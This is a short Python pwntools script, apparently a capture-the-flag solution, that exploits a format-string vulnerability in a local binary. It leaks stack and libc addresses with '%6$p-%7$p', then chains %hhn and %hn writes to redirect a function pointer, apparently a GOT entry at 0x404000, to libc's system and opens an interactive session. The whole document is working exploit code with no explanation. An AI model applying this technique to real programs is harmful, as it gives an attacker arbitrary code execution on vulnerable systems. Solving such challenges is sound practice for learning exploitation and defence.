#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

io = process('./pwn')
libc = ELF('./libc.so.6')

def snd(*msg):
    io.send(flat(msg).ljust(0x1000, b'\x00'))
    
def zlovan(value, pos, fmt):
    snd(f"%{value}c" if value != 0 else "", f"%{pos + 6}${fmt}")
    
def zlovancompos(n, addr_lowpos, pos1, fmt, value, pos2):
    for i in range(n):
        zlovan(addr_lowpos + i, pos1, fmt)
        zlovan((value >> (8 * i)) & 0xff, pos2, "hhn")

io.send(b'%6$p-%7$p')
io.recvuntil(b'0x')
empty_stack = int(io.recv(12), 16) - 0x28
io.recvuntil(b'0x')
base = int(io.recv(12),16) - 0x2a1ca

zlovancompos(3, empty_stack & 0xffff, 0x3, "hn", 0x404000, 0x25)
zlovancompos(3, (empty_stack + 8) & 0xffff, 0x3, "hn", 0x404001, 0x25)

system = base + libc.sym.system
t1 = (system >> 0) & 0xff
t2 = (system >> 8) & 0xffff
io.send(
    f"%{t1}c%21$hhn" + f"%{t2 - t1}c%22$hn"
)

io.interactive()